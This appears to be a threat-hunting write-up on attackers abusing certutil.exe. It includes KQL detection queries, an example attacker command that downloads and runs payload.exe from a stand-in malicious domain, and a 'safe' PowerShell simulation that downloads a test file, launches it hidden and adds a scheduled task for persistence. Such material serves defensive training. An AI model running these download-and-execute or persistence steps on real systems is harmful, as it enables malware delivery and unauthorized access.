# Threat Hunt Scenario: Suspicious Use of Certutil for Payload Download

## 🔍 Threat Event: Suspicious Use of Certutil
**Description:**  
Adversaries used `certutil.exe`, a known Living Off the Land Binary (LOLBIN), to download and execute a suspicious payload.

---

## 🎯 Reason for Threat Hunt

- **Trigger:**  
  Security team received an alert from the firewall indicating an outbound connection to a known malware-hosting domain.

- **Context:**  
  Certutil abuse for downloading files has been highlighted in recent cybersecurity advisories and APT threat intelligence feeds.  
  (Reference: [MITRE ATT&CK T1105 – Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/))

- **Directive:**  
  Management requested a proactive hunt for any endpoints using LOLBINs like `certutil.exe` for unauthorized downloads.

---

## 🧪 Steps Taken by the "Bad Actor" – Logs & IoCs

1. **Command Shell Opened (CMD/PowerShell)**
2. **Payload Downloaded Using Certutil:**

```bash
certutil -urlcache -split -f http://malicious-domain.com/payload.exe C:\Users\Public\payload.exe
```
3. **Payload Executed:**

```vbnet
Copy
Edit
C:\Users\Public\payload.exe
```
4. **Persistence Established:**
Created a malicious scheduled task for persistence.

5. **C2 Connection Established:**
Connected to a remote Command and Control server on port 443.

🧩 Artifacts & Hunting Tables

| Artifact Table              | Purpose                                         |
| --------------------------- | ----------------------------------------------- |
| `DeviceProcessEvents`       | Detect certutil execution and payload execution |
| `DeviceFileEvents`          | Confirm payload was written to disk             |
| `DeviceNetworkEvents`       | Detect outbound connections to C2 servers       |
| `DeviceScheduledTaskEvents` | Identify malicious scheduled task persistence   |

📘 Related KQL Queries
🔍 Certutil Abuse for File Download
```kql
DeviceProcessEvents
| where FileName == "certutil.exe"
| where ProcessCommandLine has_all("http", "-urlcache", "-split", "-f")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
```
📄 Payload Dropped to Disk
```kql
DeviceFileEvents
| where FolderPath contains "C:\\Users\\Public"
| where FileName endswith ".exe"
| where InitiatingProcessFileName == "certutil.exe"
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine
```
🚀 Payload Execution
```kql
DeviceProcessEvents
| where FolderPath contains "C:\\Users\\Public"
| where FileName endswith ".exe"
| where InitiatingProcessFileName != "certutil.exe"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
```
🌐 Network Connections from Payload
```kql
DeviceNetworkEvents
| where InitiatingProcessFileName endswith ".exe"
| where InitiatingProcessFolderPath contains "C:\\Users\\Public"
| where RemotePort == 443
| project Timestamp, DeviceName, InitiatingProcessFileName, RemoteIP, RemoteUrl
```
🛠 Persistence via Scheduled Task
```kql
DeviceScheduledTaskEvents
| where TaskAction contains "payload.exe"
| project Timestamp, DeviceName, TaskName, TaskAction, InitiatingProcessFileName
```
📎 Notes
Monitor use of certutil.exe with suspicious flags (-urlcache, -split, -f).

Prioritize endpoints with public folder .exe executions followed by outbound traffic.

✅ Hunting Goal: Identify and contain endpoints abusing certutil to fetch and launch malicious executables.

## 👤 Created By

* **Author**: Aduragbemi
* **LinkedIn**: [Aduragbemi Oladapo](https://www.linkedin.com/in/aduragbemioladapo/)
* **Date**: June 26, 2025

---

## ✅ Validated By

* **Reviewer**: *TBD*
* **Contact**: *TBD*
* **Date**: *TBD*

---
💻 Simulation Script (Safe)
```Powershell
# Create a simulated payload URL and destination path
$payloadUrl = "https://hel1-speed.hetzner.com/100MB.bin"
$payloadPath = "$env:PUBLIC\payload.exe"

# Use certutil.exe to download the "payload"
Write-Host "[+] Downloading file using certutil..."
Start-Process -FilePath "certutil.exe" -ArgumentList "-urlcache -split -f $payloadUrl `"$payloadPath`"" -Wait

# Confirm file exists
if (Test-Path $payloadPath) {
    Write-Host "[+] Payload downloaded successfully: $payloadPath"
} else {
    Write-Host "[!] Failed to download payload."
    exit
}

# Simulate execution of the payload
Write-Host "[+] Simulating payload execution..."
Start-Process -FilePath "$payloadPath" -WindowStyle Hidden

# Simulate persistence using a scheduled task
$taskName = "SimulatedPayloadTask"
Write-Host "[+] Creating scheduled task for persistence..."
schtasks /create /tn $taskName /tr "$payloadPath" /sc minute /mo 30 /f

# Optional: Wait and then clean up
Start-Sleep -Seconds 5
Write-Host "[+] Cleaning up (Optional)..."
schtasks /delete /tn $taskName /f
Remove-Item $payloadPath -Force

Write-Host "[+] Simulation completed."


```

## 📅 Revision History

| Version | Changes       | Date          | Modified By                |
| ------- | ------------- | ------------- | -------------------------- |
| 1.0     | Initial Draft | June 26, 2025 | Aduragbemi Oladapo |

---

